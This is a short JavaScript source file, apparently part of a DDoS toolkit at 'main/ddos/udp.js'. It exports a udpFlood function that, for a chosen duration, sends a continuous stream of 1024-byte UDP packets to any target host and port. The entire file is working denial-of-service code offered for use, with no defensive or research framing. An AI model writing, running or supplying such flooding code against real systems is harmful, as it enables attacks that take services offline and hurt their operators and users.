// main/ddos/udp.js
async function udpFlood(target, duration) {
  const url = new URL(target);
  const hostname = url.hostname;
  const port = url.port || 80;

  const startTime = Date.now();
  while (Date.now() - startTime < duration * 1000) {
    try {
      const socket = require('dgram').createSocket('udp4');
      const message = Buffer.alloc(1024, 'A');

      socket.send(message, port, hostname, (err) => {
        if (err) {
          console.error(`UDP send error: ${err}`);
        }
        socket.close();
      });
    } catch (error) {
      console.error(`Error creating or sending UDP packet: ${error}`);
    }
    await new Promise(resolve => setTimeout(resolve, 0)); // Prevent blocking
  }
  console.log(`UDP flood finished against ${target}`);
}

module.exports = { udpFlood };